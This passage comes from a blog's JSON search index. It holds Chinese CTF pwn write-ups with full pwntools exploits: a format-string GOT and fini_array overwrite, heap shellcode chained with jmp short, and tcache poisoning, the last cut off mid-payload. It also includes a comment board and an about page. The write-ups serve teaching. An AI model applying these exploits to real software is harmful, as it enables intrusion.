main函数中，首先接收stdin的输入，最多输入64个字符，然后将输入的内容进行拼接，拼接后直接printf打印。 getnline： 就是普通的读取输入的函数。注意，这里调用了fgets，strchr，strlen函数。 漏洞点\r很明显，格式化字符串漏洞。不过在查看文件，发现调用过system函数。同时got可读可写，所以考虑将某个函数的got表写为system@plt。然后想办法调用/bin/sh。 这里有个问题，就是printf打印完后，直接结束程序运行。那么，基本是没有办法通过一次格式化漏洞就获取shell的，要想覆盖eip就得泄露栈地址，不可能一边泄露栈地址一边往栈地址上写。因此，需要研究一下，怎样能够让程序能再一次回到main函数。 知识点\rmain函数并不是程序运行的起点，我们知道在__libc_start_main函数中调用了main函数。网上有一些资料，解析x86程序运行的初始化函数执行流，详情请见这个地址。这里，只拿出一张图分析： 可以看到，_start函数中，调用了__libc_start_main，然后调用main函数。初始化的时候，调用init.array数组中的函数指针，退出的时候，调用fini.array数组的函数指针。因此，我们只需要把fini.array的第一个元素覆盖为main或者_start函数的地址即可。 在IDA中按下ctrl + S，可以看到程序段： 地址为0x8049934。 利用思路\r步骤： 第一次printf，将strlen@got写为system@plt，同时，将0x8049934，也就是fini.array处写为_start地址，获得了第二次输入的机会 输入/bin/sh，会调用strlen(s)，实际调用system(\"/bin/sh\")。 EXP\r一开始用fmtstr_payload生成payload，长度为70，超过了64。因此，手动写一下。 首先观察一下，正常情况下，0x8049934处的值是多少： 我们要改写为0x80484f0，不难发现，只需要改写低两个字节即可。高两个字节保持为0x0804不动。 准备手动写payload。这里先测一下偏移，输入：aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x 输出为： 好像aaaa被分开输出了，说明前面有2位的偏移，于是，修改输入为：bbaaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x 再来一次： 计算一下偏移，offset = 12。注意，前面有两个a，还有一句Nice to meet you, ，也就是说，前面已经输出了0x14个字符。 直接使用%n写四个字节容易写失败，这里使用$hn两个字节依次写入。本次要往str@got(0x8049a54)写入为system@plt(0x8048490)，然后将fini.array(0x8049934)的低两个字节写为0x84f0根据要格式化字符串要写的内容，对写的字节大小排个序： 本次写入，要达到的目的为： 往0x8049a56 ——\u003e 0x0804 往0x8049a54 ——\u003e 0x8490 往0x8049934 ——\u003e 0x84f0 最后结合偏移量，最终的payload为： payload = b'aa' payload += b'%2032c%21$hn' + b'%31884c%22$hn' + b'%96c%23$hna' + p32(0x8049a56) + p32(0x8049a54) + p32(0x8049934) 然后调试一下，看看是不是都改对了： 修改前： 修改后： 此时，获得了第二次输入机会： 输入/bin/dash即可得到shell。 完整Exp\rfrom pwn import * io = process('./greeting') payload = b'aa' payload += b'%2032c%21$hn' + b'%31884c%22$hn' + b'%96c%23$hna' + p32(0x8049a56) + p32(0x8049a54) + p32(0x8049934) io.recvuntil(\"Please tell me your name... \") print(payload, len(payload)) sleep(1) io.sendline(payload) io.recvuntil(\"Please tell me your name... \") sleep(1) io.sendline('/bin/sh') io.sendline('cat flag') io.interactive() ","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-mma-ctf-2nd-2016-greeting/:0:0","tags":["pwn"],"title":"MMA-CTF-2nd-2016-greeting","uri":"/zh-cn/2021-03-28-mma-ctf-2nd-2016-greeting/"},{"categories":["pwn-wp"],"content":"总结\r做完这道题，收获如下： 1）汇编语句jmp short s，最后编译出来的机器码为\\xEB\\x??，问号代表pc寄存器会往前或往后跳转x个字节，x的范围为-128~127。要从??结束后算起。正数往前跳，负数往回跳。 2）修改某个函数的got表地址后，可以将目标地址填充为一段shellcode，如果是在堆上，那么需要借助jmp short指令。算好偏移。 3）mov rsi, 0比xor rsi, rsi要长，尽量用后面的，尽量用xor来置0。 4）mov rax, 0x3b比mov eax, 0x3b要长，如果长度有限制就用后面的，高位均为0的时候，尽量使用位数更短的寄存器。 Checksec\r发现关闭了NX，可能要利用shellcode。 题目分析\r首先把附件放在IDA中打开，发现是个菜单题： main： sub_E30: menu: add_note: 可以看到，没有检查idx是否合法，可以在任意地址写一个堆地址。 注意：如果申请的大小为8，最多只能写7个字节。 delete_note: 选项2和选项3并没有什么用。 由于程序关闭了堆栈不可执行，因此可以考虑修改某一个函数got表的内容为堆地址，在堆上写shellcode。 解题思路\r尝试的解题思路\r发现有UAF漏洞，看能不能从UAF入手，泄露出libc的基地址或程序的基地址。然后，一顿思考后，发现程序没有edit，没有show，还只让输入8个字节，这就有点难搞。所以这个思路不太行。 由于在add_note中，没有校验输入的idx，所以是可以修改func@got的内容的，填充为一个堆地址。但是只让写7个字节，啥shellcode会这么短啊······谷歌后，发现一个gadget叫jmp short，可以拼接跳转执行，再加上一些滑板指令，就能拼凑出完整的shellcode。 这里需要注意，只让写7个字节，所以指令的机器码不能太长，用xor代替mov，用mov eax, 0x3b代替mov rax , 0x3b。还有jmp short的机器码是\\xEB，后面直接接一个偏移。偏移要算上后面的8个字节，加上下一个chunk的pre_size和size，所以一共是1+8+8+8=0x19 。也就是说前面填满5个字节，接一个\\xEB\\x19即可。 最终解题思路\r1）申请一块内存大小为8，内容/bin/sh 2）修改free@got的内容为堆地址 3）利用jmp short s往连续的几块chunk写入shellcode，shellcode为执行execve的系统调用。除去pop rdi; ret。因为free(ptr)，会自动mov rdi, ptr。 4）调用delete_note，释放前面的/bin/sh的内存块 编写EXP\r首先把函数写好： def add_note(idx:int, size:int, content:bytes=b'\\x00'): global io io.sendlineafter(\"your choice\u003e\u003e \", '1') io.sendlineafter(\"index:\", str(idx)) io.sendlineafter(\"size:\", str(size)) io.sendlineafter(\"content:\", content) def delete_note(idx:int): global io io.sendlineafter(\"your choice\u003e\u003e \", '4') io.sendlineafter(\"index:\", str(idx)) 首先分配一块带有/bin/sh的，预备调用。然后，往索引为-17处分配，修改free@got的内容为堆地址，顺便写上一条shellcode，xor rsi, rsi。这里选用\\xc0作为滑板指令。 add_note(0, 8, b'/bin/sh') add_note(-17 , 8, asm('xor rsi, rsi') + b'\\xC0\\xC0\\xEB\\x19') -17的计算是这样的： 可以看到，free@got的偏移为0x202018，题目中存储堆地址起始位置为0x2020a0，所以索引就是(0x202018 - 0x2020a0) // 8 = -17。 这里给出申请前后free@got的内容变化： 申请前： 申请后： 可以看到，free@got已修改成功，同时写上了xor rsi,rsi; \\xc0\\xc0\\xeb\\x19。 然后继续写： add_note(1, 8, asm('xor rdx, rdx') + b'\\xC0\\xC0\\xEB\\x19') add_note(2, 8, asm('mov eax, 59') + b'\\xEB\\x19') add_note(4, 8, asm('syscall')) 之后就会： 最后： delete_note(0) # get shell 完整exp\rfrom pwn import * io = process('./note') context.update(arch='amd64', os='linux', endian='little') def add_note(idx:int, size:int, content:bytes=b'\\x00'): global io io.sendlineafter(\"your choice\u003e\u003e \", '1') io.sendlineafter(\"index:\", str(idx)) io.sendlineafter(\"size:\", str(size)) io.sendlineafter(\"content:\", content) def delete_note(idx:int): global io io.sendlineafter(\"your choice\u003e\u003e \", '4') io.sendlineafter(\"index:\", str(idx)) # 利用 jmp short s指令写shellcode # 修改free@got处地址为堆地址 add_note(0, 8, b'/bin/sh') add_note(-17 , 8, asm('xor rsi, rsi') + b'\\x0C\\x0C\\xEB\\x19') add_note(1, 8, asm('xor rdx, rdx') + b'\\x0C\\x0C\\xEB\\x19') add_note(2, 8, asm('mov eax, 59') + b'\\xEB\\x19') add_note(4, 8, asm('syscall')) delete_note(0) io.interactive() ","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-ciscn-2018-quals-note-service2/:0:0","tags":["pwn"],"title":"CISCN-2018-Quals-note-service2","uri":"/zh-cn/2021-03-28-ciscn-2018-quals-note-service2/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： tcache bin的利用都不需要伪造chunk，直接修改tcache chunk的next指针即可。但是libc2.27之后的版本加入了检查。 tcache bin dup，也不存在检查，当有UAF漏洞的时候，可以直接对tcache chunk多次释放。 tcache chunk不会和top_chunk合并。 题目要读仔细，对于一些奇怪的操作，可以复现一下，加快分析速度！ 题目分析\rChecksec\r没有开启PIE防护。 函数分析\rMain\r可以看出来，是个很经典的菜单题。 Menu\r提供三个选择，接下来依次来看 New_note\r这个函数要注意以下几点： 输入索引的范围是0~0x10，也就是说最多可以存储17个chunk malloc的范围为0~0x1000 输出了每个chunk地址的低3个字节 0x6020e0存储chunk的指针，但是存储的是输入的idx和分配到的chunk_ptr的或值 外部输入的idx和实际存放在0x6020e0数组的索引并不一致！！ Del_note\r这里有两点要注意： 外部输入的idx并不是会对应去删除0x6020e0[idx]处的chunk，而是遍历0x6020e0处的数组，对每一个地址ptr \u0026 0xf取出索引，再和外部输入的idx比较，如果一样，就去删除这个地方的chunk 找到索引后，取出的要删除的chunk的地址是通过ptr \u0026 0xfffffffffffffff0计算得到的 Edit_note\r这里寻找索引和取出chunk的方式和del_note是一样的。 漏洞点\r漏洞点就在于很奇怪的计算索引和计算chunk地址的方式，分析这两种计算方式，可以发现： 由于chunk的地址一定是页对齐的，所以分配堆的地址的最后一位肯定是0x?0。这个地址和[0, 0xf]之间的索引取或值，对地址前面的值是不影响的，如0x20 | 0xf = 0x2f。因此，这个时候使用ptr \u0026 0xf取索引没问题，使用ptr \u0026 0xf0取原来的chunk指针，也没问题。 但是，如果给的索引是0x10，那么就有问题了。举例说明：假设分配到的chunk_ptr地址的最后一位为0x60，那么按照new_note的存储方式，数组中最后存的地址为0x60 | 0x10 = 0x70。要取出索引，得输入0x70 \u0026 0xf = 0x0，取出的chunk_ptr为0x70 \u0026 0xf0 = 0x70。那么如果调用del_note或edit_note，实际上处理的地址不是0x60，而是为0x70。 也就是说，如果首先创建0x10为idx的chunk，调用edit_note的时候，要输入的索引实际不能是0x10，而是0，并且编辑的地址会往高地址移动0x10个字节。这可以修改下一个chunk的pre_size和size域大小。 利用思路\r步骤： 分配一个chunk A，输入索引为0x10，大小为0x10 分配一个chunk B，输入索引为0x1，大小为0x10 分配一个chunk C，输入索引为0x2，大小为0x10 分配一个chunk D，输入索引为0x3，大小为0x20 分配一个chunk E，输入索引为0x4，大小为0x10，输入内容为/bin/sh\\x00 通过edit_note接口，输入索引0，来修改chunk B的size为0x71，这是为了把chunk C和chunk D都囊括进来，制造overlapped chunk。 依次释放chunk B 和chunk C和chunk D 分配一个chunk F，输入索引为0x1，大小为0x60，把刚刚释放那个假的chunk申请回来，并修改已经释放了的chunk C和chunk D的next指针 利用tcache bin attack分别分配chunk G到free@got处和chunk H到setbuf@got处，将free@got覆盖为put@plt，将setbuf@got填为‘a’ * 8。然后调用del_note(chunk H)，泄露出atoi函数的地址。 最后利用edit_not接口来修改chunk G，将free@got修改为system地址，最后del_note(chunk E)获取到shell EXP\r调试过程\r首先，写好函数，并且也可以定义一个数组，存储chunk地址，模拟0x6020e0数组，同时，保证变化与程序一致。 # x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址 qword_0x6020e0 = [[0, 0]] * 17 def show_qword_0x6020e0(): '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！''' global qword_0x6020e0 addr = 0x6020e0 for x in qword_0x6020e0: if x[0] == 0: continue fstr = 'Addr:{} StorePtr:{} RealPtr:{} GetPtr:{} GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] \u0026 0xfff0),hex(x[0] \u0026 0xf)) if (x[1]) != (x[0] \u0026 0xfff0): print_green('[*] ' + fstr) else: log.info(fstr) addr += 8 def new_note(idx:int, size:int, content:bytes=b'\\x00'): global io, qword_0x6020e0 assert idx \u003e= 0 and idx \u003c= 0x10 io.sendlineafter(\"your choice: \", '1') io.sendlineafter(\"index: \", str(idx)) io.sendlineafter(\"size: \", str(size)) io.sendafter(\"content: \", content) low_bytes = io.recvline() log.info('get msg:{}'.format(low_bytes)) low_bytes = low_bytes[12:-1] low_bytes = int16(low_bytes.decode()) store_low = (low_bytes | idx) for i in range(0x11): if qword_0x6020e0[i][0] == 0: qword_0x6020e0[i] = [store_low, low_bytes] break return low_bytes, i def del_note(idx:int): global io, qword_0x6020e0 io.sendlineafter(\"your choice: \", '2') io.sendlineafter(\"index: \", str(idx)) msg = io.recvline() count = -1 for x in qword_0x6020e0: count += 1 if (x[0] \u0026 0xf) == idx: x[0] = 0 x[1] = 0 break return msg, count def edit_note(idx:int, content:bytes): global io io.sendlineafter(\"your choice: \", '3') io.sendlineafter(\"index: \", str(idx)) io.sendafter(\"content: \", content) io.recvuntil(\"edit success.\\n\\n\") 按照利用思路分配chunk，并打印数组看看： # get chunk new_note(0x10, 0x10) # idx 0 chunk A new_note(0x1, 0x10) # idx 1 chunk B new_note(0x2, 0x10) # idx 2 chunk C new_note(0x3, 0x20) # idx 3 chunk D new_note(0x4, 0x10, b'/bin/sh\\x00') # idx 4 chunk E show_qword_0x6020e0() # show array 的确是这样的： 看下堆： 然后修改size域： # edit and overlap size field edit_note(0, p64(0) + p64(0x71)) 释放这个假chunk： # del_note 1 chunk B and re-malloc it del_note(1) 重新malloc回来，然后释放chunk C/D，并修改它们的next指针： new_note(0x1, 0x60) # idx 1 chunk F # del_note 2 chunk C and 3 chunk D del_note(2) del_note(3) # change the next pointer of freed chunk C and freed chunk D payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p","date":"2021-03-28","objectID":"/zh-cn/2021-03-28-ciscn_2019_final_5/:0:0","tags":["pwn"],"title":"ciscn_2019_final_5","uri":"/zh-cn/2021-03-28-ciscn_2019_final_5/"},{"categories":null,"content":"\r信息\r欢迎来到我的留言板！ 无论你有什么想法、建议或是问题，都欢迎在这里留言交流。你的每一条留言都是我持续创作的动力，谢谢你的关注与支持！\r","date":"2025-06-07","objectID":"/zh-cn/comment/:0:0","tags":null,"title":"留言板","uri":"/zh-cn/comment/"},{"categories":null,"content":" About Me\rC/C++程序员 import工程师 pytorch调参手 linux kernel爱好者 CTF业余选手 Achievements\r欢迎使用pwncli：https://github.com/RoderickChan/pwncli 提出三种新的glibc下IO FILE利用方法： house of apple1 house of apple2 house of apple3 pwn 训练营： 在Bilibili上观看 在Youtube上观看 Contact Me\rgithub: https://github.com/RoderickChan email: roderickchan@foxmail.com bilibili: https://space.bilibili.com/3461577038629345 youtube: https://studio.youtube.com/channel/UCERZwLUl-Lk8AZ8z0BBo8WQ 其他\r分享的文件一般可以在 download.roderickchan.cn 进行下载，用户名和密码分别是：roderick/rode@rick。 ","date":"2022-10-02","objectID":"/zh-cn/about/:0:0","tags":null,"title":"关于我","uri":"/zh-cn/about/"}]